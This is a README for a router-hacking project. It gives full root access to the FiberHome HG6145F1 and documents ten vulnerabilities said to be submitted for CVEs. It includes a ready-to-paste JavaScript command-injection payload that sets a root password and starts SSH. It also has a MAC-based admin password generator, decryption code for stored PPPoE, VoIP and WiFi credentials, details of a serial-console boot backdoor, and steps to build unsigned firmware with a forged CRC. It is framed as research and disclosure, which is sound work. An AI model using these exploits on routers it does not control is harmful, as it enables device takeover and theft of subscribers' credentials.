# FiberHome HG6145F1 — Full Access & Custom WebUI

**By [Smothy](https://merzougrayane.com/) — [Numb Team](https://numbhub.com/)**

Full admin access, root shell, and custom dark WebUI for the FiberHome HG6145F1 (Algeria Telecom RP4423 firmware).

![Router](https://img.shields.io/badge/Router-HG6145F1-blue) ![ISP](https://img.shields.io/badge/ISP-Algeria%20Telecom-green) ![Access](https://img.shields.io/badge/Access-Root%20Shell-red)

---

## CVE Submissions

The following vulnerabilities were discovered and submitted for CVE assignment:

| # | Vulnerability | Type | CVSS | Status |
|---|--------------|------|------|--------|
| 1 | Predictable Admin Password (MAC to MD5) | Weak Credential Generation | 8.8 High | Submitted |
| 2 | RCE via `triger_speedtest` Command Injection | Command Injection | 9.8 Critical | Submitted |
| 3 | Hardcoded AES Key (`ABCDEFGHIJKLMNOP`) | Hardcoded Crypto Key | 7.5 High | Submitted |
| 4 | Unsigned Firmware Upload | Improper Integrity Verification | 8.8 High | Submitted |
| 5 | Unauthenticated Information Disclosure | Information Leak | 5.3 Medium | Submitted |
| 6 | XOR Config File "Encryption" | Weak Cryptography | 7.5 High | Submitted |
| 7 | Boot Process Manufacturer Backdoor | Hidden Authentication | 9.0 Critical | Submitted |
| 8 | Cleartext Credential Transmission | Missing Encryption | 6.5 Medium | Submitted |
| 9 | No CSRF Protection | Cross-Site Request Forgery | 6.5 Medium | Submitted |
| 10 | All Services Run as Root | Improper Privilege Management | 7.0 High | Submitted |

---

## Quick Start

### Step 1 — Get Admin Password

```bash
python3 passgen.py
# Enter your router's MAC address (from the sticker on the bottom)
# Username: admin
```

### Step 2 — Upload Custom Firmware

1. Login to `http://192.168.1.1` with the generated password
2. Go to **Management > Device Management > Local Upgrade**
3. Upload `custom-webui.bin` and click **Update File**
4. Wait for **"File upgrade failed"** message — this is expected
5. Refresh the page — custom UI is now active

### Step 3 — Enable SSH

After uploading the firmware, open the browser console (F12) on the router page and paste:

```javascript
var x=new XMLHttpRequest();x.open('GET','/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid',false);x.send();var s=JSON.parse(x.responseText).sessionid;var x2=new XMLHttpRequest();x2.open('POST','/cgi-bin/ajax',false);x2.setRequestHeader('Content-type','application/x-www-form-urlencoded');x2.send('ajaxmethod=triger_speedtest&url=;/fhrom/bin/dropbearkey -t rsa -f /tmp/dbrsa;echo root:root123|chpasswd;/fhrom/bin/dropbear -p 2222 -r /tmp/dbrsa&sessionid='+s);console.log(x2.responseText);
```

Then connect via SSH:

```bash
ssh -p 2222 root@192.168.1.1
# Password: root123
```

---

## What You Get

- **Custom dark WebUI** with blue accents
- **Full admin access** with all hidden menus unlocked
- **Root SSH shell** on port 2222
- **RCE** via `triger_speedtest` command injection
- Unlocked features:
  - Custom DNS settings
  - PPPoE / VoIP password retrieval
  - SSID Isolation
  - Dynamic DNS (DDNS)
  - QoS settings
  - Parental Control
  - DLNA / Samba / NAT / ALG
  - System Log viewer
  - Port Mapping / DMZ / UPNP

> **Note:** Custom WebUI and unlocked menus persist across reboots (auto-applied via cron within ~1 minute). Only SSH needs to be re-enabled after reboot — paste the JavaScript from Step 3 in the browser console. No need to re-upload the `.bin`.

---

## Vulnerabilities

### CVE-1: Predictable Admin Password

The admin password is derived from the router's MAC address using MD5 with a static salt (`AEJLY`). Anyone who knows the MAC address (visible on the device sticker or via the web interface) can generate the admin password.

```python
md5 = hashlib.md5(mac.encode() + b"AEJLY").hexdigest()
# Password derived from first 20 hex chars using character mapping
```

### CVE-2: RCE via Command Injection

The `triger_speedtest` CGI method passes user input directly to `system()`:

```c
snprintf(cmd, 0x100, "/fhrom/bin/speedtest %s &", url_param);
system(cmd);
```

Exploit: `url=;COMMAND` executes arbitrary commands as root.

**Notes:**
- Nginx WAF blocks `>` in POST body — use `wget` or `tee` instead of redirection
- `system()` always returns `{"ret":0}`
- Session ID required (obtain via `get_refresh_sessionid`)

### CVE-3: Hardcoded AES Key

Config encryption uses a fully deterministic, hardcoded AES-128-ECB key:

```python
key = bytes(range(65, 81))    # "ABCDEFGHIJKLMNOP"
iv  = bytes(range(48, 64))    # "0123456789:;<=>?"
```

All "encrypted" config values (PPPoE passwords, VoIP credentials) can be decrypted offline:

```python
from Crypto.Cipher import AES
cipher = AES.new(bytes(range(65, 81)), AES.MODE_ECB)
plaintext = cipher.decrypt(bytes.fromhex("HEX_STRING")).rstrip(b'\x00')
```

### CVE-4: Unsigned Firmware Upload

The firmware upgrade mechanism uses CRC32 with a non-standard init value (0 instead of 0xFFFFFFFF) as the only integrity check. There is no cryptographic signature verification. Any attacker with admin access can upload and execute arbitrary ARM binaries.

**Firmware header format:**
- Magic: `~@$^*)+ATOS!#%&(` at offset `0x100`
- CRC32 (init=0) of payload at offset `0x166`
- Section size (ASCII) at offset `0x220`
- Payload (ARM ELF binary) at offset `0xE00`

### CVE-5: Unauthenticated Information Disclosure

The CGI endpoint `/cgi-bin/ajax` exposes sensitive device info without authentication:

```
GET /cgi-bin/ajax?ajaxmethod=get_base_info
```

Returns: MAC address, GPON serial number, hardware/software versions, ONU state, LOID, CPU/memory usage, optical power levels — all without login. The MAC disclosure is critical because the admin password is derived from the MAC address, enabling full unauthenticated admin takeover.

### CVE-6: XOR Config File "Encryption"

Config file export/import uses a trivially reversible XOR cipher with no key:

```c
// libfhapi.so — fhapi_file_crypt_decrypt()
for (i = len - len/9527; i != 2*len - len/9527; i++)
    output = getc(file) ^ (i + 9527);
```

Exported config files containing PPPoE credentials, VoIP passwords, and WiFi keys can be decrypted offline by anyone. This is separate from the AES vulnerability — XOR is used for file-level encryption while AES is used for individual credential storage.

### CVE-7: Boot Process Manufacturer Backdoor

The boot script `/fhrom/fhshell/initialize.sh` contains a manufacturer backdoor:

```bash
macaddr=$(uci get /fhdata/factory_conf.brmac.value | tr -d ":" | \
  tr [a-z] [A-Z] | tr [0123456789ABCDEF] [FEDCBA9876543210])
macaddr=${macaddr:6:6}
read -n9 -t 2 passwd
passwd1=${passwd:0:3}
passwd_fh=$(echo -n $passwd1 | sha1sum | cut -d " " -f1)
if [ $passwd_fh == "ef431b3bb9e0f022134ebde6d2b87c66ca2c58d2" ]; then
    if [ ${passwd:3:6} == $macaddr ]; then
        echo "force exit!!"
        exit 0  # drops to root shell
    fi
fi
```

During the 2-second boot window, entering a 9-character password via serial console (UART) — 3 chars matching SHA1 hash `ef431b3b...` + 6 chars from MAC transformation — bypasses all security initialization and gives root shell. The SHA1 hash can be brute-forced trivially (only 17,576 combinations for 3 lowercase chars).

### CVE-8: Cleartext Credential Transmission

The web admin interface runs on HTTP (port 80) with no HTTPS enabled by default. Admin credentials are "encrypted" client-side with AES using a hardcoded key embedded in JavaScript (see CVE-3), providing no protection against network sniffing. All admin operations — password changes, PPPoE credential viewing, firmware uploads — are transmitted in cleartext.

### CVE-9: Cross-Site Request Forgery (No CSRF Protection)

The CGI binary uses a rotating session ID (`get_refresh_sessionid`) for POST authorization, but this is not a proper CSRF token — it's predictable and obtainable via unauthenticated GET request. No Origin/Referer validation. An attacker can craft a malicious page that performs admin actions when visited by a logged-in admin:

- Change admin/user passwords
- Modify WiFi/DNS/WAN settings
- Upload malicious firmware
- Execute arbitrary commands (via RCE)
- Reboot the device

### CVE-10: All Services Run as Root (No Privilege Separation)

Every service runs as uid=0 with no privilege separation:

- `nginx.conf`: `user root;`
- `thttpd.conf`: `user=root`
- CGI binary: all `system()` calls as root
- sysmgr, cfgmgr, dnsrelay, pppd — all root
- No non-root user accounts exist
- No SELinux, AppArmor, seccomp, or capabilities

Any vulnerability in any service immediately grants full root access to the entire system.

---

## Technical Details

### Router Architecture

| Detail | Value |
|--------|-------|
| Kernel | Linux 4.19.183 armv7l |
| Chip | BCM6855X |
| Root | uid=0 |
| Web root | `/www/` (read-only UBIFS) |
| CGI binary | `/www/cgi-bin/ajax` (ARM ELF) |
| Config | `/fhconf/` (persistent, survives reboot) |
| SSH binary | `/fhrom/bin/dropbear` |

### CRC32 Algorithm

Standard CRC32 with **init value 0** (non-standard):

```python
def custom_crc32(data):
    table = []
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xEDB88320
            else:
                crc >>= 1
        table.append(crc)
    crc = 0  # init=0, not 0xFFFFFFFF
    for byte in data:
        crc = table[(byte ^ crc) & 0xFF] ^ (crc >> 8)
    return crc & 0xFFFFFFFF
```

### Firmware Header Format

```
Offset  Size  Description
0x000   16    Hardware version
0x010   16    Hardware version (compatible)
0x100   16    Magic: "~@$^*)+ATOS!#%&("
0x110   16    Hardware version (copy)
0x130   16    Software version
0x166   4     CRC32 of payload (LE, init=0)
0x170   16    Chip type (BCM6855X)
0x1F0   16    Section count (ASCII)
0x200   48    Section entry (name + size)
0xE00   ...   Payload (ARM ELF binary)
```

### Config File Encryption (XOR)

```c
for (i = len - len/9527; i != 2*len - len/9527; i++)
    output = getc(file) ^ (i + 9527);
```

---

## Building from Source

### Requirements

- `gcc-arm-linux-gnueabi` (ARM cross-compiler)
- Python 3

### Build

```bash
# Create tar.gz of webui files
cd webui-files && tar czf ../payload.tar.gz . && cd ..

# Convert to object file
arm-linux-gnueabi-objcopy -I binary -O elf32-littlearm -B arm \
  payload.tar.gz payload.o

# Compile ARM binary
arm-linux-gnueabi-gcc -static -Os -o patcher patcher.c payload.o

# Build .bin with correct header + CRC
python3 -c "
import struct
def crc32(d):
    t=[0]*256
    for i in range(256):
        c=i
        for _ in range(8): c=(c>>1)^0xEDB88320 if c&1 else c>>1
        t[i]=c
    c=0
    for b in d: c=t[(b^c)&0xFF]^(c>>8)
    return c&0xFFFFFFFF
h=bytearray(open('header_template.bin','rb').read())
p=open('patcher','rb').read()
h[0x220:0x230]=str(len(p)).encode().ljust(16,b'\x00')
struct.pack_into('<I',h,0x166,crc32(p))
open('custom-webui.bin','wb').write(bytes(h)+p)
"
```

---

## Files

```
hg6145f1-full-access/
├── README.md              # This guide
├── passgen.py             # Admin password generator
├── custom-webui.bin       # Upload via Local Upgrade
├── customize.py           # Deploy custom theme via RCE
├── patcher.c              # ARM binary source code
├── deploy.sh              # Manual deploy script (via SSH)
├── persist.sh             # Boot persistence script
└── webui-files/           # Custom WebUI files
    ├── css/               # Dark theme (blue accents)
    ├── html/              # Custom login page
    ├── image/
    ├── js/                # Unlocked access controls
    └── menu/              # Full admin menu
```

---

## Disclaimer

This project is for **educational and security research purposes only**. Use it on routers you own or have explicit permission to modify. The vulnerabilities documented here have been submitted for CVE assignment through responsible disclosure.

---

## Credits

- **[Smothy](https://merzougrayane.com/)** — Firmware reverse engineering, CRC algorithm discovery, custom WebUI, vulnerability research
- **[Numb Team](https://numbhub.com/)** — Research & Development

---

## License

MIT License — See [LICENSE](LICENSE)
